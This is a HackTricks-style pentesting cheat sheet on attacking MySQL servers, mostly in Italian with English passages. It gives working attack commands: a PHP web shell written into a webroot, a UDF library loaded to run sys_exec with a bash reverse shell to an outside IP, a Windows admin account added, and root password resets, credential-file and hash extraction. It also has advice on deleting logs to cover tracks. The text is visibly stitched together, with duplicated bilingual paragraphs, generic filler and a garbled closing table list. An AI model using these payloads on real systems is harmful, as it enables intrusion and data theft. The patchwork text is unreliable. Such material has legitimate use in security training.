# 3306 - Pentesting Mysql

## 3306 - Pentesting Mysql

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) √® l'evento sulla sicurezza informatica pi√π rilevante in **Spagna** e uno dei pi√π importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso √® un punto di incontro bollente per professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

### **Informazioni di base**

**MySQL** pu√≤ essere descritto come un **Sistema di Gestione di Database Relazionali (RDBMS)** open source disponibile gratuitamente. Opera sul **Structured Query Language (SQL)**, consentendo la gestione e la manipolazione dei database.

**Porta predefinita:** 3306

```
3306/tcp open  mysql
```

To connect to a local MySQL server, you can use the following command:

```bash
mysql -u <username> -p
```

Replace `<username>` with the username you want to use to connect to the server. You will be prompted to enter the password for the user.

#### **Remote**

To connect to a remote MySQL server, you can use the following command:

```bash
mysql -h <hostname> -P <port> -u <username> -p
```

Replace `<hostname>` with the IP address or hostname of the remote server, `<port>` with the port number on which the MySQL server is running (default is 3306), `<username>` with the username you want to use to connect, and you will be prompted to enter the password for the user.

### **Enumerate**

#### **Databases**

To list all the databases on the MySQL server, you can use the following command:

```sql
SHOW DATABASES;
```

#### **Tables**

To list all the tables in a specific database, you can use the following command:

```sql
USE <database_name>;
SHOW TABLES;
```

Replace `<database_name>` with the name of the database you want to enumerate.

#### **Columns**

To list all the columns in a specific table, you can use the following command:

```sql
USE <database_name>;
SHOW COLUMNS FROM <table_name>;
```

Replace `<database_name>` with the name of the database containing the table, and `<table_name>` with the name of the table you want to enumerate.

#### **Data**

To retrieve data from a specific table, you can use the following command:

```sql
USE <database_name>;
SELECT * FROM <table_name>;
```

Replace `<database_name>` with the name of the database containing the table, and `<table_name>` with the name of the table from which you want to retrieve data.

### **Exploit**

#### **SQL Injection**

To exploit a SQL injection vulnerability in a web application, you can use techniques such as:

* Union-based SQL injection
* Error-based SQL injection
* Blind SQL injection

These techniques involve manipulating the input parameters of a vulnerable web application to execute arbitrary SQL queries and retrieve sensitive information from the database.

#### **Privilege Escalation**

To escalate privileges on a MySQL server, you can try the following techniques:

* Exploiting misconfigured user privileges
* Exploiting vulnerabilities in MySQL server versions
* Cracking weak passwords

These techniques aim to gain higher privileges on the server, allowing you to perform actions that are restricted to privileged users.

### **Post-Exploitation**

#### **Dumping Data**

To dump the contents of a MySQL database, you can use the following command:

```bash
mysqldump -u <username> -p <database_name> > dump.sql
```

Replace `<username>` with the username you used to connect to the database, `<database_name>` with the name of the database you want to dump, and `dump.sql` with the desired output file.

#### **Creating Backdoors**

To create a backdoor on a MySQL server, you can use techniques such as:

* Creating a new user with administrative privileges
* Modifying existing user privileges
* Uploading malicious code to the server

These techniques allow you to maintain access to the server even after the initial exploitation.

#### **Covering Tracks**

To cover your tracks on a MySQL server, you can perform actions such as:

* Deleting logs and audit trails
* Modifying timestamps and file attributes
* Removing evidence of your activities

These actions aim to make it difficult for investigators to trace your actions back to you.

```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```

#### Remoto

MySQL allows remote connections by default. This means that an attacker can potentially connect to a MySQL server from a remote location. It is important to secure remote access to prevent unauthorized access to the database.

To secure remote access, you can follow these steps:

1. **Bind MySQL to a specific IP address**: By default, MySQL listens on all available IP addresses. You can change this by modifying the `bind-address` parameter in the MySQL configuration file (`my.cnf`). Set it to the IP address you want MySQL to listen on.
2. **Enable firewall rules**: Configure your firewall to only allow incoming connections to the MySQL port (usually 3306) from trusted IP addresses. This will restrict access to the MySQL server.
3. **Use strong passwords**: Ensure that all MySQL user accounts have strong passwords. Weak passwords can be easily guessed or cracked, allowing unauthorized access to the database.
4. **Limit user privileges**: Grant only the necessary privileges to MySQL user accounts. Avoid granting unnecessary privileges, as this can increase the risk of unauthorized access.
5. **Enable SSL/TLS encryption**: MySQL supports SSL/TLS encryption for secure communication between the client and the server. Enable SSL/TLS to protect sensitive data transmitted over the network.

By following these steps, you can enhance the security of your MySQL server and protect it from remote attacks.

```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```

### Enumerazione esterna

Alcune delle azioni di enumerazione richiedono credenziali valide

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```

#### [**Forza bruta**](../generic-methodologies-and-resources/brute-force.md#mysql)

#### Scrivi qualsiasi dato binario

```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```

### **Comandi MySQL**

MySQL √® un sistema di gestione di database relazionali molto popolare che utilizza un linguaggio di query strutturato chiamato SQL. Di seguito sono riportati alcuni comandi comuni utilizzati per interagire con un database MySQL:

* `SHOW DATABASES;`: Mostra tutti i database presenti nel server MySQL.
* `USE <database_name>;`: Seleziona il database specificato per l'utilizzo.
* `SHOW TABLES;`: Mostra tutte le tabelle presenti nel database selezionato.
* `DESCRIBE <table_name>;`: Mostra la struttura della tabella specificata.
* `SELECT * FROM <table_name>;`: Restituisce tutti i record presenti nella tabella specificata.
* `INSERT INTO <table_name> (column1, column2, ...) VALUES (value1, value2, ...);`: Inserisce un nuovo record nella tabella specificata.
* `UPDATE <table_name> SET column1 = value1, column2 = value2, ... WHERE condition;`: Aggiorna i record nella tabella specificata che soddisfano la condizione specificata.
* `DELETE FROM <table_name> WHERE condition;`: Elimina i record dalla tabella specificata che soddisfano la condizione specificata.

Questi sono solo alcuni dei comandi pi√π comuni utilizzati con MySQL. √à possibile utilizzare molti altri comandi per eseguire operazioni pi√π avanzate come l'aggiunta di indici, la creazione di viste e la gestione degli utenti.

```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```

#### Enumerazione dei permessi MySQL

To enumerate MySQL permissions, you can use the following techniques:

Per enumerare i permessi di MySQL, puoi utilizzare le seguenti tecniche:

**1. SHOW GRANTS**

This command displays the privileges granted to a specific user or users in the MySQL database.

Questo comando visualizza i privilegi concessi a un utente specifico o agli utenti nel database MySQL.

```sql
SHOW GRANTS FOR 'username'@'localhost';
```

**2. INFORMATION\_SCHEMA**

The INFORMATION\_SCHEMA database contains tables that provide information about the MySQL server's metadata, including user privileges.

Il database INFORMATION\_SCHEMA contiene tabelle che forniscono informazioni sui metadati del server MySQL, inclusi i privilegi degli utenti.

```sql
SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE LIKE '%username%';
```

**3. mysql.user Table**

This table contains information about MySQL users and their privileges.

Questa tabella contiene informazioni sugli utenti MySQL e i loro privilegi.

```sql
SELECT * FROM mysql.user WHERE user = 'username';
```

**4. SHOW GRANTS FOR CURRENT\_USER()**

This command displays the privileges granted to the currently logged-in user.

Questo comando visualizza i privilegi concessi all'utente attualmente connesso.

```sql
SHOW GRANTS FOR CURRENT_USER();
```

**5. SHOW PRIVILEGES**

This command displays the available privileges in the MySQL server.

Questo comando visualizza i privilegi disponibili nel server MySQL.

```sql
SHOW PRIVILEGES;
```

By using these techniques, you can effectively enumerate the permissions granted to MySQL users, allowing you to identify potential security vulnerabilities and weaknesses in the database configuration.

Utilizzando queste tecniche, puoi enumerare efficacemente i permessi concessi agli utenti MySQL, consentendoti di identificare potenziali vulnerabilit√† di sicurezza e debolezze nella configurazione del database.

```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```

Puoi vedere nella documentazione il significato di ogni privilegio: [https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv\_execute)

#### MySQL File RCE

{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
[mysql-ssrf.md](../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md)
{% endcontent-ref %}

### Lettura arbitraria di file MySQL da parte del client

Attualmente, quando si tenta di **caricare dati locali in una tabella**, il server MySQL o MariaDB chiede al **client di leggerlo** e inviare il contenuto. **Quindi, se riesci a manipolare un client MySQL per connettersi al tuo server MySQL, puoi leggere file arbitrari.**\
Si prega di notare che questo √® il comportamento utilizzando:

```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```

(Nota la parola "local")\
Perch√© senza la parola "local" puoi ottenere:

```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

**PoC Iniziale:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**In questo documento puoi vedere una descrizione completa dell'attacco e anche come estenderlo a RCE:** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**Qui puoi trovare una panoramica dell'attacco:** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √® l'evento sulla sicurezza informatica pi√π rilevante in **Spagna** e uno dei pi√π importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso √® un punto di incontro vivace per i professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

### POST

#### Utente Mysql

Sarebbe molto interessante se mysql fosse in esecuzione come **root**:

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```

**Impostazioni pericolose di mysqld.cnf**

Nella configurazione dei servizi MySQL, vengono utilizzate diverse impostazioni per definire il loro funzionamento e le misure di sicurezza:

* L'impostazione **`user`** viene utilizzata per designare l'utente con cui verr√† eseguito il servizio MySQL.
* **`password`** viene utilizzata per stabilire la password associata all'utente MySQL.
* **`admin_address`** specifica l'indirizzo IP che ascolta le connessioni TCP/IP sull'interfaccia di rete amministrativa.
* La variabile **`debug`** indica le configurazioni di debug attuali, inclusi dati sensibili nei log.
* **`sql_warnings`** gestisce la generazione di stringhe di informazioni per le istruzioni INSERT a singola riga quando si verificano avvisi, inclusi dati sensibili nei log.
* Con **`secure_file_priv`**, viene limitato il campo di operazioni di importazione ed esportazione dei dati per migliorare la sicurezza.

#### Escalation dei privilegi

```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```

#### Escalazione dei privilegi tramite libreria

Se il **server mysql viene eseguito come root** (o un utente con privilegi superiori) √® possibile farlo eseguire comandi. Per fare ci√≤, √® necessario utilizzare **funzioni definite dall'utente**. E per creare una funzione definita dall'utente sar√† necessaria una **libreria** per il sistema operativo su cui viene eseguito mysql.

La libreria dannosa da utilizzare pu√≤ essere trovata all'interno di sqlmap e all'interno di metasploit eseguendo **`locate "*lib_mysqludf_sys*"`**. I file **`.so`** sono librerie **linux** e i file **`.dll`** sono quelli di **Windows**, scegli quello di cui hai bisogno.

Se **non hai** queste librerie, puoi cercarle o scaricare questo [**codice C per linux**](https://www.exploit-db.com/exploits/1518) e **compilarlo all'interno della macchina vulnerabile linux**:

```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Ora che hai la libreria, accedi a Mysql come utente privilegiato (root?) e segui i passaggi successivi:

**Linux**

```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```

**Windows**

**MySQL Enumeration**

Per enumerare le informazioni sul server MySQL in esecuzione su un sistema Windows, √® possibile utilizzare i seguenti metodi:

1. **Port Scanning**: Utilizzare uno strumento di scansione delle porte come Nmap per individuare le porte aperte sul sistema target. La porta predefinita per MySQL √® la 3306.
2. **Banner Grabbing**: Utilizzare uno strumento come Telnet o Netcat per connettersi alla porta MySQL e ottenere il banner di benvenuto. Questo pu√≤ fornire informazioni sul server MySQL in esecuzione.
3. **Enumeration Tools**: Utilizzare strumenti di enumerazione come MySQL Enumeration Script (MySQLEnum) o MySQLDumper per ottenere informazioni sulle versioni del server MySQL, gli utenti, i database e le tabelle presenti.

**MySQL Password Cracking**

Per effettuare il cracking delle password MySQL su un sistema Windows, √® possibile utilizzare i seguenti metodi:

1. **Brute-Force**: Utilizzare uno strumento di cracking delle password come Hydra o Medusa per eseguire un attacco di forza bruta contro il server MySQL. Questo metodo prova diverse combinazioni di password fino a trovare quella corretta.
2. **Dictionary Attack**: Utilizzare uno strumento come John the Ripper o Hashcat per eseguire un attacco di dizionario contro il server MySQL. Questo metodo utilizza un elenco di parole comuni o dizionari per provare a indovinare la password corretta.
3. **Rainbow Tables**: Utilizzare un set di tabelle rainbow precalcolate per cercare corrispondenze tra hash delle password e password originali. Questo metodo pu√≤ accelerare il processo di cracking delle password.

**MySQL Exploitation**

Per sfruttare le vulnerabilit√† di MySQL su un sistema Windows, √® possibile utilizzare i seguenti metodi:

1. **SQL Injection**: Utilizzare tecniche di SQL injection per eseguire comandi SQL dannosi sul server MySQL. Questo pu√≤ consentire l'esecuzione di comandi non autorizzati o l'estrazione di dati sensibili dal database.
2. **Privilege Escalation**: Sfruttare le vulnerabilit√† di escalation dei privilegi per ottenere accesso amministrativo al server MySQL. Questo pu√≤ consentire l'esecuzione di comandi con privilegi elevati o l'accesso a dati sensibili.
3. **Remote Code Execution**: Sfruttare le vulnerabilit√† di esecuzione remota del codice per eseguire codice dannoso sul server MySQL. Questo pu√≤ consentire l'esecuzione di comandi arbitrari o l'installazione di malware sul sistema target.

**MySQL Post-Exploitation**

Dopo aver compromesso un server MySQL su un sistema Windows, √® possibile eseguire le seguenti azioni:

1. **Data Extraction**: Estrarre dati sensibili dal database MySQL compromesso. Questo pu√≤ includere informazioni personali, credenziali di accesso o dati aziendali sensibili.
2. **Privilege Escalation**: Sfruttare ulteriori vulnerabilit√† per ottenere privilegi pi√π elevati sul server MySQL. Questo pu√≤ consentire l'accesso a dati o funzionalit√† riservate.
3. **Persistence**: Creare meccanismi di persistenza per mantenere l'accesso al server MySQL anche dopo un riavvio o una disconnessione. Questo pu√≤ includere la creazione di account di backdoor o la modifica delle impostazioni di configurazione del server.
4. **Lateral Movement**: Utilizzare il server MySQL compromesso come punto di partenza per eseguire attacchi su altri sistemi nella rete. Questo pu√≤ consentire l'espansione dell'accesso e l'estrazione di dati da altri sistemi.

```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

#### Estrarre le credenziali MySQL dai file

All'interno di _/etc/mysql/debian.cnf_ √® possibile trovare la **password in chiaro** dell'utente **debian-sys-maint**.

```bash
cat /etc/mysql/debian.cnf
```

Puoi **utilizzare queste credenziali per accedere al database MySQL**.

All'interno del file: _/var/lib/mysql/mysql/user.MYD_ puoi trovare **tutti gli hash degli utenti MySQL** (quelli che puoi estrarre da mysql.user all'interno del database).

Puoi estrarli eseguendo:

```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

#### Abilitazione del logging

√à possibile abilitare il logging delle query MySQL all'interno di `/etc/mysql/my.cnf` rimuovendo i commenti dalle seguenti righe:

![](<../.gitbook/assets/image (277).png>)

#### File utili

File di configurazione

* windows \*
* config.ini
* my.ini
* windows\my.ini
* winnt\my.ini
* \<InstDir>/mysql/data/
* unix
* my.cnf
* /etc/my.cnf
* /etc/mysql/my.cnf
* /var/lib/mysql/my.cnf
* \~/.my.cnf
* /etc/my.cnf
* Cronologia dei comandi
* \~/.mysql.history
* File di log
* connections.log
* update.log
* common.log

### Database/Tabelle predefinite di MySQL

ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS

columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user

accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread

host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait\_by\_latency\
latest\_file\_io\
memory\_by\_host\_by\_current\_bytes\
memory\_by\_thread\_by\_current\_bytes\
memory\_by\_user\_

## Schema\_table\_statistics

## Schema\_table\_statistics\_with\_buffer

## Schema\_tables\_with\_full\_table\_scans

## Schema\_unused\_indexes

## Session

## Session\_ssl\_status

## Statement\_analysis

## Statements\_with\_errors\_or\_warnings

## Statements\_with\_full\_table\_scans

## Statements\_with\_runtimes\_in\_95th\_percentile

## Statements\_with\_sorting

## Statements\_with\_temp\_tables

## Sys\_config

## User\_summary

## User\_summary\_by\_file\_io

## User\_summary\_by\_file\_io\_type

## User\_summary\_by\_stages

## User\_summary\_by\_statement\_latency

## User\_summary\_by\_statement\_type

## Version

## Wait\_classes\_global\_by\_avg\_latency

## Wait\_classes\_global\_by\_latency

## Waits\_by\_host\_by\_latency

## Waits\_by\_user\_by\_latency

## Waits\_global\_by\_latency

## X$host\_summary

## X$host\_summary\_by\_file\_io

## X$host\_summary\_by\_file\_io\_type

## X$host\_summary\_by\_stages

## X$host\_summary\_by\_statement\_latency

## X$host\_summary\_by\_statement\_type

## X$innodb\_buffer\_stats\_by\_schema

## X$innodb\_buffer\_stats\_by\_table

## X$innodb\_lock\_waits

## X$io\_by\_thread\_by\_latency

## X$io\_global\_by\_file\_by\_bytes

## X$io\_global\_by\_file\_by\_latency

## X$io\_global\_by\_wait\_by\_bytes

## X$io\_global\_by\_wait\_by\_latency

## X$latest\_file\_io

## X$memory\_by\_host\_by\_current\_bytes

## X$memory\_by\_thread\_by\_current\_bytes

## X$memory\_by\_user\_by\_current\_bytes

## X$memory\_global\_by\_current\_bytes

## X$memory\_global\_total

## X$processlist

## X$ps\_digest\_95th\_percentile\_by\_avg\_us

## X$ps\_digest\_avg\_latency\_distribution

## X$ps\_schema\_table\_statistics\_io

## X$schema\_flattened\_keys

## X$schema\_index\_statistics

## X$schema\_table\_lock\_waits

## X$schema\_table\_statistics

## X$schema\_table\_statistics\_with\_buffer

## X$schema\_tables\_with\_full\_table\_scans

## X$session

## X$statement\_analysis

## X$statements\_with\_errors\_or\_warnings

## X$statements\_with\_full\_table\_scans

## X$statements\_with\_runtimes\_in\_95th\_percentile

## X$statements\_with\_sorting

## X$statements\_with\_temp\_tables

## X$user\_summary

## X$user\_summary\_by\_file\_io

## X$user\_summary\_by\_file\_io\_type

## X$user\_summary\_by\_stages

## X$user\_summary\_by\_statement\_latency

## X$user\_summary\_by\_statement\_type

## X$wait\_classes\_global\_by\_avg\_latency

## X$wait\_classes\_global\_by\_latency

## X$waits\_by\_host\_by\_latency

## X$waits\_by\_user\_by\_latency

## X$waits\_global\_by\_latency

```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

